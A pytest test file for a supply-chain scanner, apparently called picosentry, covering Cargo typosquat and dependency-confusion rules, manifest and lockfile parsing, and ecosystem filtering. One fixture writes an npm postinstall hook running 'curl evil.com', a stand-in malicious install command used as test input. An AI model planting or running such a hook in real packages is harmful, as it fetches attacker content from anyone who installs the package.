"""Tests for Cargo ecosystem rules.

Tests cover:
- Ecosystem detection (Cargo.toml)
- Cargo typosquat detection (L2-CARGO-TYPO-001)
- Cargo dependency confusion (L2-CARGO-DEPC-001)
- Cargo advisory check (L2-CARGO-ADV-001)
- Engine ecosystem filtering
"""

from pathlib import Path

from picosentry.scan.engine import create_default_engine

# ── Fixture helpers ────────────────────────────────────────────────────

FIXTURES = Path(__file__).parent / "fixtures"


def _cargo_clean() -> Path:
    return FIXTURES / "cargo_clean"


def _cargo_malicious() -> Path:
    return FIXTURES / "cargo_malicious"


# ── Ecosystem detection ────────────────────────────────────────────────


class TestCargoDetection:
    """Cargo project detection should work with Cargo.toml."""

    def test_detects_cargo_toml(self):
        from picosentry.scan.rules.cargo_utils import detect_cargo_project
        assert detect_cargo_project(_cargo_clean())

    def test_detects_cargo_toml_malicious(self):
        from picosentry.scan.rules.cargo_utils import detect_cargo_project
        assert detect_cargo_project(_cargo_malicious())

    def test_no_indicator_returns_false(self, tmp_path):
        from picosentry.scan.rules.cargo_utils import detect_cargo_project
        assert not detect_cargo_project(tmp_path)


# ── Engine ecosystem filtering ─────────────────────────────────────────


class TestCargoEcosystemFiltering:
    """The engine should filter Cargo rules when the target has no Cargo indicators."""

    def test_npm_project_skips_cargo_rules(self, tmp_path):
        """A plain npm project should not run Cargo rules."""
        (tmp_path / "package.json").write_text('{"name":"test","version":"1.0.0"}')
        engine = create_default_engine()
        result = engine.scan(str(tmp_path))
        for f in result.findings:
            assert not f.rule_id.startswith("L2-CARGO-"), f"Unexpected Cargo rule: {f.rule_id}"

    def test_cargo_project_runs_cargo_rules(self, tmp_path):
        """A Cargo project with internal-looking deps should produce findings."""
        (tmp_path / "Cargo.toml").write_text(
            '[package]\nname = "test"\nversion = "0.1.0"\n'
            '[dependencies]\ncompany-internal-lib = "0.1"\n'
        )
        engine = create_default_engine()
        result = engine.scan(str(tmp_path))
        cargo_findings = [f for f in result.findings if f.ecosystem == "cargo"]
        assert len(cargo_findings) >= 1, f"Expected Cargo findings, got: {result.findings}"

    def test_cargo_rules_registered(self):
        """All Cargo rule IDs should be registered by default."""
        engine = create_default_engine()
        rules = engine.list_rules()
        shared_rules = [r for r in rules if r in ("L2-TYPO-001", "L2-DEPC-001", "L2-ADV-001")]
        assert len(shared_rules) == 3, f"Expected shared rules, got {len(shared_rules)}"
        assert "L2-TYPO-001" in shared_rules
        assert "L2-DEPC-001" in shared_rules
        assert "L2-ADV-001" in shared_rules


# ── Typosquat tests ────────────────────────────────────────────────────


class TestCargoTyposquat:
    """Cargo typosquat detection (L2-CARGO-TYPO-001)."""

    def test_detects_typosquat_in_malicious(self):
        """Cargo.toml with 'srede' (typo for 'serde') should trigger typosquat."""
        from picosentry.scan.rules.typosquat import detect_all_typosquat as detect_cargo_typosquat
        target = _cargo_malicious()
        findings = detect_cargo_typosquat(target, Path(""))
        typos = [f for f in findings if f.rule_id == "L2-CARGO-TYPO-001"]
        assert len(typos) >= 1, f"Expected typosquat finding, got: {[f.package for f in findings]}"
        tymsg = typos[0].message.lower()
        assert "srede" in tymsg or "serde" in tymsg, f"Expected srede→serde typo, got: {typos[0].message}"
        assert typos[0].ecosystem == "cargo"

    def test_clean_project_no_typosquats(self):
        """Clean project should have no typosquat findings."""
        from picosentry.scan.rules.typosquat import detect_all_typosquat as detect_cargo_typosquat
        target = _cargo_clean()
        findings = detect_cargo_typosquat(target, Path(""))
        assert len(findings) == 0, f"Clean project should have no typos: {findings}"


# ── Dependency confusion tests ─────────────────────────────────────────


class TestCargoDependencyConfusion:
    """Cargo dependency confusion detection (L2-CARGO-DEPC-001)."""

    def test_detects_internal_dep_without_private_config(self):
        """internal-auth without private registry should be flagged."""
        from picosentry.scan.rules.dep_confusion import detect_all_dep_confusion as detect_cargo_dep_confusion
        target = _cargo_malicious()
        findings = detect_cargo_dep_confusion(target)
        internal = [f for f in findings if "internal" in f.package]
        assert len(internal) >= 1, f"Expected dep confusion finding, got: {[f.package for f in findings]}"
        assert internal[0].rule_id == "L2-CARGO-DEPC-001"

    def test_detects_my_corp_lib_confusion(self):
        """my-corp-lib without private registry should be flagged."""
        from picosentry.scan.rules.dep_confusion import detect_all_dep_confusion as detect_cargo_dep_confusion
        target = _cargo_malicious()
        findings = detect_cargo_dep_confusion(target)
        corp = [f for f in findings if "my-corp" in f.package]
        assert len(corp) >= 1, f"Expected dep confusion finding, got: {[f.package for f in findings]}"
        assert corp[0].rule_id == "L2-CARGO-DEPC-001"

    def test_clean_project_no_confusion(self):
        """Clean project with only public crates should have no confusion findings."""
        from picosentry.scan.rules.dep_confusion import detect_all_dep_confusion as detect_cargo_dep_confusion
        target = _cargo_clean()
        findings = detect_cargo_dep_confusion(target)
        assert len(findings) == 0, f"Clean project should have no dep confusion: {findings}"

    def test_private_registry_config_skips_flags(self, tmp_path):
        """When private registry is configured, internal deps are safe."""
        from picosentry.scan.rules.dep_confusion import detect_all_dep_confusion as detect_cargo_dep_confusion
        (tmp_path / "Cargo.toml").write_text(
            '[package]\nname = "test"\nversion = "0.1.0"\n\n[dependencies]\ninternal-auth = "0.1.0"\n'
        )
        (tmp_path / ".cargo" / "config.toml").parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / ".cargo" / "config.toml").write_text(
            '[registries.my-private]\nindex = "https://private.crates.io/git/index"\n'
        )
        findings = detect_cargo_dep_confusion(tmp_path)
        internal = [f for f in findings if "internal" in f.package]
        assert len(internal) == 0, f"Private registry should suppress dep confusion: {internal}"


# ── Cargo.toml parsing tests ───────────────────────────────────────────


class TestCargoTomlParsing:
    """Cargo.toml parsing should correctly extract package metadata."""

    def test_parse_package_name(self):
        from picosentry.scan.rules.cargo_utils import parse_cargo_toml
        data = parse_cargo_toml(_cargo_clean())
        assert data is not None
        assert "my-awesome-crate" in data.get("package_name", "")

    def test_parse_direct_deps(self):
        from picosentry.scan.rules.cargo_utils import parse_cargo_toml
        data = parse_cargo_toml(_cargo_clean())
        assert data is not None
        deps = set(data.get("dependencies", {}).keys())
        assert "serde" in deps
        assert "tokio" in deps
        assert "clap" in deps

    def test_no_cargo_toml_returns_none(self, tmp_path):
        from picosentry.scan.rules.cargo_utils import parse_cargo_toml
        assert parse_cargo_toml(tmp_path) is None


class TestCargoLockParsing:
    """Cargo.lock parsing should correctly extract pinned versions."""

    def test_parse_cargo_lock(self):
        from picosentry.scan.rules.cargo_utils import parse_cargo_lock
        packages = parse_cargo_lock(_cargo_clean())
        assert packages is not None
        assert len(packages) >= 1
        names = {p["name"] for p in packages}
        assert "serde" in names
        assert "tokio" in names

    def test_no_cargo_lock_returns_none(self, tmp_path):
        from picosentry.scan.rules.cargo_utils import parse_cargo_lock
        assert parse_cargo_lock(tmp_path) is None


class TestCargoLockfileParser:
    """Lockfile parser wrapper should work correctly."""

    def test_parse_cargo_toml_for_lock(self):
        from picosentry.scan.rules.cargo_lock_parser import parse_cargo_toml_for_lock
        path = _cargo_clean() / "Cargo.toml"
        entries = parse_cargo_toml_for_lock(path)
        assert len(entries) >= 1
        names = {e[0] for e in entries}
        assert "serde" in names

    def test_parse_cargo_lock_for_lock(self):
        from picosentry.scan.rules.cargo_lock_parser import parse_cargo_lock_for_lock
        path = _cargo_clean() / "Cargo.lock"
        entries = parse_cargo_lock_for_lock(path)
        assert len(entries) >= 1
        names = {e[0] for e in entries}
        assert "serde" in names

    def test_auto_detect_cargo_toml(self):
        from picosentry.scan.rules.cargo_lock_parser import parse_cargo_lockfile
        entries = parse_cargo_lockfile(_cargo_clean() / "Cargo.toml")
        assert len(entries) >= 1

    def test_auto_detect_cargo_lock(self):
        from picosentry.scan.rules.cargo_lock_parser import parse_cargo_lockfile
        entries = parse_cargo_lockfile(_cargo_clean() / "Cargo.lock")
        assert len(entries) >= 1

    def test_no_file_returns_empty(self, tmp_path):
        from picosentry.scan.rules.cargo_lock_parser import parse_cargo_lockfile
        assert parse_cargo_lockfile(tmp_path / "nonexistent") == []


class TestCargoUtils:
    """Cargo utility functions should work correctly."""

    def test_get_cargo_dep_names(self):
        from picosentry.scan.rules.cargo_utils import get_cargo_dep_names
        data = {
            "package_name": "test",
            "dependencies": {
                "serde": "1.0",
                "tokio": "1.35",
            },
        }
        deps = get_cargo_dep_names(data)
        assert "serde" in deps
        assert "tokio" in deps

    def test_detect_private_registry(self):
        from picosentry.scan.rules.cargo_utils import detect_private_cargo_registry
        target = _cargo_clean()
        assert not detect_private_cargo_registry(target)

    def test_detect_private_registry_with_config(self, tmp_path):
        from picosentry.scan.rules.cargo_utils import detect_private_cargo_registry
        cargo_dir = tmp_path / ".cargo"
        cargo_dir.mkdir(parents=True, exist_ok=True)
        (cargo_dir / "config.toml").write_text(
            '[registries.my-private]\nindex = "https://private.crates.io/git/index"\n'
        )
        (tmp_path / "Cargo.toml").write_text('[package]\nname = "test"\nversion = "0.1.0"\n')
        assert detect_private_cargo_registry(tmp_path)

    def test_detect_private_registry_with_path_dep(self, tmp_path):
        from picosentry.scan.rules.cargo_utils import detect_private_cargo_registry
        (tmp_path / "Cargo.toml").write_text(
            '[package]\nname = "test"\nversion = "0.1.0"\n\n[dependencies]\nmy-lib = { path = "../my-lib" }\n'
        )
        assert detect_private_cargo_registry(tmp_path)

    def test_detect_private_registry_with_patch(self, tmp_path):
        from picosentry.scan.rules.cargo_utils import detect_private_cargo_registry
        (tmp_path / "Cargo.toml").write_text(
            '[package]\nname = "test"\nversion = "0.1.0"\n\n[patch.crates-io]\nserde = { path = "../patched-serde" }\n'
        )
        assert detect_private_cargo_registry(tmp_path)


# ── Full engine integration tests ──────────────────────────────────────


class TestCargoIntegration:
    """Full engine scan against Cargo fixtures."""

    def test_clean_project_no_findings(self):
        """A clean Cargo project should produce minimal findings."""
        engine = create_default_engine()
        result = engine.scan(str(_cargo_clean()))
        cargo_findings = [f for f in result.findings if f.ecosystem == "cargo"]
        assert len(cargo_findings) == 0, f"Clean Cargo project should have no Cargo findings: {cargo_findings}"

    def test_malicious_project_has_findings(self):
        """A malicious Cargo project should produce findings."""
        engine = create_default_engine()
        result = engine.scan(str(_cargo_malicious()))
        cargo_findings = [f for f in result.findings if f.ecosystem == "cargo"]
        assert len(cargo_findings) >= 1, f"Expected Cargo findings from malicious fixture, got: {len(cargo_findings)}"

    def test_ecosystem_field_on_cargo_findings(self):
        """Cargo findings should have ecosystem='cargo'."""
        engine = create_default_engine()
        result = engine.scan(str(_cargo_malicious()))
        cargo_findings = [f for f in result.findings if f.ecosystem == "cargo"]
        if cargo_findings:
            for f in cargo_findings:
                assert f.ecosystem == "cargo"

    def test_npm_findings_still_have_npm_ecosystem(self, tmp_path):
        """npm findings should still default to ecosystem='npm'."""
        (tmp_path / "package.json").write_text(
            '{"name":"test","version":"1.0.0","scripts":{"postinstall":"curl evil.com"}}'
        )
        engine = create_default_engine()
        result = engine.scan(str(tmp_path))
        npm_findings = [f for f in result.findings if f.ecosystem == "npm"]
        if npm_findings:
            for f in npm_findings:
                d = f.to_dict()
                assert d["ecosystem"] == "npm"

    def test_cargo_rules_skipped_when_no_cargo_project(self, tmp_path):
        """When there's no Cargo.toml, Cargo rules should not execute."""
        (tmp_path / "readme.txt").write_text("hello")
        engine = create_default_engine()
        result = engine.scan(str(tmp_path))
        for f in result.findings:
            assert not f.rule_id.startswith("L2-CARGO-"), f"Unexpected Cargo rule: {f.rule_id}"
